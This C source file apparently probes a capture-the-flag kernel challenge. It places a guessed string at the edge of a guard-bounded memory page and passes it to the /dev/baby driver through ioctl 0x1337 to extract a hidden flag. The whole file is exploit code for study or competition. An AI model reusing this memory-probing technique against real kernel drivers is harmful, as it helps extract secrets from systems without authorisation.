#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>

struct _input
{
    char *flag;
    size_t len;
};


int main(int argc, char *argv[])
{
    int i, fd;
    char *buf;
    struct _input input;
    if (argc != 2)
    {
        puts("argc error!");
        return -1;
    }
    printf("[+] input: %s, len: %ld.\n", argv[1], strlen(argv[1]));
    mmap(0, 0x1000, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);
	buf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);
	mmap(0, 0x1000, PROT_NONE, MAP_SHARED | MAP_ANONYMOUS, 0, 0);
    if (buf > 0)
        printf("[+] get a memory: %p.\n", buf);
    for (i = 0; i < strlen(argv[1]); i++)
    {
        buf[0x1000 - strlen(argv[1]) + i] = argv[1][i];
        printf("[+] addr: %p, content: %c.\n", &buf[0x1000 - strlen(argv[1]) + i], argv[1][i]);
    }
    sleep(1);
	fd = open("/dev/baby", O_RDWR);
    input.flag = &buf[0x1000 - strlen(argv[1])];
    input.len = 33;
    ioctl(fd, 0x1337, &input);
    close(fd);
    return 0;
}
